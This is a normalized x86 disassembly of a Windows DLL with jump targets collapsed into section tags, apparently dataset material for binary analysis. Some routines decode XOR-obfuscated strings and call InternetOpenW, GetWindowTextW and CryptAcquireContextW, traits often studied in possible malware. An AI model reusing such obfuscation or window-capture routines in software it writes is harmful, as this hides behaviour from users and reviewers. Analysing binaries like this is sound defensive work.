mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
push 0x16
pop eax
pop ebp
retn
sub_1000dc70
push ebp
mov ebp esp
sub esp 0x8
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax ]
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edx [ edi ]
mov edx [ edx + 0x10 ]
lea eax [ ebp + 0x10 ]
push eax
lea ecx [ ebp + 0xa ]
push ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push esi
lea eax [ ebp - 0x8 ]
push eax
mov ecx edi
call edx
test eax eax
jne r-xdata
cmp eax 0x3
mov eax [ ebp - 0x4 ]
jne r-xdata
lea eax [ ebp + 0xa ]
cmp [ ebp + 0x10 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
pop edi
sub eax esi
pop esi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x4 ]
mov esi [ ebp + 0xc ]
cmp ecx [ ebp + 0x14 ]
jb r-xdata
inc [ ebp - 0x4 ]
cmp esi ebx
je r-xdata
sub_1000dd00
push ebp
mov ebp esp
mov eax [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push esi
push eax
mov eax [ ebp + 0x10 ]
mov esi ecx
mov ecx [ ebp + 0x18 ]
push ecx
mov ecx [ ebp + 0x8 ]
push edx
push eax
push ecx
mov [ esi ] 0x0
call [ InternetOpenW@IAT ]
xor edx edx
test eax eax
setne dl
mov [ esi ] eax
push edx
call sub_1002f000
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x18
sub_1000dd40
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push esi
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcf
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0xb
jb r-xdata
xor eax eax
lea edx [ ebp - 0x68 ]
push edx
mov [ ebp - 0x6 ] ax
mov [ ebp - 0x68 ] eax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x1c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xf2
call sub_1000a6f0
mov esi [ ebp - 0x68 ]
call sub_10009820
mov esi eax
mov eax [ ebp - 0x68 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
je r-xdata
mov esi [ edi + 0x12c ]
test esi esi
je r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x1c ]
lea edx [ ebp - 0x64 ]
push edx
lea edx [ ebp - 0x1c ]
mov [ ebp - 0x64 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x64 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov edx [ esi ]
lea ecx [ ebp - 0x64 ]
push ecx
mov ecx edi
call sub_1000a880
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1000de59
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1006312b
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1000defd
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_10078970
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_1000818a
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_1000818a
pop ecx
sub_1000e030
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f65f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
mov edi [ GetProcessHeap@IAT ]
xor ebx ebx
push 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] eax
push ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x30 ] ebx
mov [ esi + 0x34 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
lea edi [ esi + 0x38 ]
push ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ eax ]
jne r-xdata
mov edx [ edi + 0x4 ]
dec [ edx ]
cmp [ edx ] ebx
jne r-xdata
mov [ edi + 0x4 ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_10008200
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp edi edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx ebx
je r-xdata
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
inc [ eax ]
mov edx [ edi ]
cmp edx ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax [ ebp - 0x14 ]
mov edx [ edi + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax ]
push 0x1
call edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push edx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
sub_1000e1e0
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
lea eax [ ebp - 0x230 ]
push eax
push ebx
mov [ ebp - 0x22c ] ebx
call [ GetWindowThreadProcessId@IAT ]
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x20c ]
[ edi ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push ebx
call [ GetWindowTextW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x214 ] 0x7
mov [ ebp - 0x218 ] 0x0
mov [ ebp - 0x228 ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x20c ]
push edx
lea ecx [ ebp - 0x228 ]
call sub_1005e3c0
mov edx [ esi + 0x4 ]
mov eax edx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea eax [ ebp - 0x228 ]
push eax
call sub_10009310
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x214 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x22c ]
xor eax eax
mov [ esi ] ecx
lea edx [ esi + 0x8 ]
movzx esi ax
mov eax esi
shl esi 0x10
or eax esi
mov esi [ ebp - 0x214 ]
mov ecx 0x82
mov edi edx
[ edi ]
mov edi [ ebp - 0x228 ]
mov eax edi
cmp esi 0x8
jae r-xdata
mov edx [ ebp - 0x228 ]
push edx
call sub_10065045
add esp 0x4
lea ecx [ ebx + ebx ]
push ecx
push eax
push edx
call sub_10078600
add esp 0xc
cmp esi 0x8
jb r-xdata
lea eax [ ebp - 0x228 ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
push edi
call sub_10065045
add esp 0x4
sub_1000e35e
mov edi edi
push ebp
mov ebp esp
push esi
xor eax eax
push 0xffffffff
mov esi ecx
and [ esi + 0x10 ] 0x0
push eax
push [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_1004b542
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1000e388
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1001b964
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
pop ecx
sub_1000e3b0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x20 ]
mov edx [ esi + 0x24 ]
mov [ esi ] eax
mov eax [ esi + 0x28 ]
mov [ esi + 0x14 ] ecx
mov [ esi + 0x18 ] edx
mov [ esi + 0x1c ] eax
call sub_100776f0
pop esi
pop ebp
retn
sub_1000e3e0
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0x98 ] ebx
xor eax eax
lea ecx [ ecx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7d
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x98 ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov ecx [ ebp - 0x98 ]
cmp ecx ebx
je r-xdata
pop edi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x2
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa0 ]
mov [ ebp - 0xa0 ] ebx
call sub_1001f670
test eax eax
je r-xdata
push esi
mov esi [ ebp - 0xa0 ]
cmp esi ebx
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x6
call sub_1000a6f0
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
mov [ ebp - 0x9c ] 0x3
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x44 ]
mov eax 0xed
call sub_1000a6f0
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
pop esi
push eax
mov [ ebp - 0x9c ] 0x4
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ebx [ esi ]
add edi 0x120
call sub_10053370
mov ebx [ esi + 0x4 ]
call sub_10068620
call sub_1000fa30
mov eax [ ebp - 0x98 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
pop esi
push eax
call edx
mov eax [ ebp - 0x9c ]
pop edi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1000e560
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x9b
cmp eax 0x4
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x30 ]
mov [ esi ] eax
mov eax [ ecx + 0x34 ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x70
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
call sub_1000a6f0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1000e5e0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10016f40
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_1000e601
push 0x20
push r--data
call sub_10078b50
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_100435f4
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_10078b95
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_1007a49b
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_1005d371
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_1003938d
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_10042f06
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000e768
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_1000e7a4
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_10028397
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_1000e7f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081450
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
xor esi esi
mov [ edi + 0x8 ] esi
mov [ edi + 0xc ] esi
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x1c ] edi
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
call sub_1001c410
mov [ ebp - 0x18 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx edi
cmp edx esi
je r-xdata
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x2
mov ecx [ edi ]
mov edx [ ecx + 0x4 ]
mov ecx [ edx + edi + 0x38 ]
mov eax [ ecx ]
mov edx [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
push ebx
push esi
push edx
call eax
add [ edi + 0x8 ] eax
mov ecx edx
adc [ edi + 0xc ] ecx
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
cmp ecx esi
je r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] esi
jne r-xdata
mov [ ebp - 0x14 ] 0x3
cmp ecx ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
xor esi esi
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
push esi
call sub_10007bc0
sub_1000e896
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
and eax 0x17
mov [ ecx + 0xc ] eax
test [ ecx + 0x10 ] eax
je r-xdata
or eax 0x4
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
push 0x1
call sub_10007bc0
sub_1000e930
mov [ esi ] r--data
cmp [ esi + 0x84 ] 0x8
jb r-xdata
mov [ esi + 0x84 ] 0x7
mov [ esi + 0x80 ] 0x0
xor ecx ecx
mov [ esi + 0x70 ] cx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
mov eax [ esi + 0x70 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] ax
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov edx [ esi + 0x2c ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] dx
retn
mov ecx [ esi + 0xc ]
push ecx
call sub_10065045
add esp 0x4
sub_1000e9b8
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp sub_1002595f
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
sub_1000ea00
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi ecx
xor ecx ecx
mov ebx edx
mov [ ebp - 0x28 ] ebx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov [ esi ] r--data
mov [ esi + 0xc ] eax
cmp edi ecx
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax 0x128
call sub_1000a6f0
mov eax ecx
cmp eax ecx
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0x9c
call sub_1000a6f0
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push edi
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea ecx [ ebx + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push ebx
push edi
push eax
mov [ esi + 0x4 ] eax
call sub_10078600
mov ebx [ ebp - 0x28 ]
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x8 ] eax
call sub_10078600
add esp 0xc
pop edi
mov eax esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_1000eb00
cmp esi ebx
je r-xdata
mov eax esi
retn
mov eax [ esi ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov [ esi ] ecx
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] ecx
mov edx [ ebx ]
mov [ esi ] edx
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov edx [ ebx + 0x8 ]
mov [ esi + 0x8 ] edx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
push edi
mov edi [ esi + 0x4 ]
call sub_1001b300
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
xor ecx ecx
pop edi
sub_1000eb62
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_100120b0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_1000eb9b
push ebp
mov ebp esp
push 0x8
push 0x1
push r--data
push 0x0
push [ ebp + 0x8 ]
call [ CryptAcquireContextW@IAT ]
neg eax
sbb eax eax
and eax 0xfffffffe
add eax 0x2
pop ebp
retn 0x4
sub_1000ebc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_100084ef
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
call sub_10012991
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax esi
sub_1000ebf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10080ca7
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ edi ] 0x0
mov eax [ edx + 0x20 ]
mov [ edi + 0x4 ] eax
lea ecx [ edi + 0x4 ]
xor eax eax
mov esi 0xf
mov [ edi + 0x1c ] esi
mov [ edi + 0x18 ] eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] edx
mov [ edi + 0x8 ] al
mov [ ebp - 0x4 ] eax
mov [ edi + 0x38 ] esi
mov [ edi + 0x34 ] eax
mov [ edi + 0x24 ] al
mov [ edi + 0x40 ] eax
mov [ edi + 0x44 ] eax
mov edx [ edx + 0x30 ]
mov [ edi + 0x48 ] edx
mov [ edi + 0x4c ] eax
mov [ edi + 0x50 ] eax
mov [ edi + 0x54 ] eax
mov [ edi + 0x58 ] eax
mov edx 0x7
xor esi esi
mov [ edi + 0x74 ] edx
mov [ edi + 0x70 ] eax
mov [ edi + 0x60 ] si
mov [ edi + 0x90 ] edx
mov [ edi + 0x8c ] eax
mov [ edi + 0x7c ] ax
push 0x4
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4
call sub_1006a560
add esp 0x4
push eax
lea ecx [ edi + 0x8 ]
mov [ ebp - 0x4 ] 0x5
call sub_100172f0
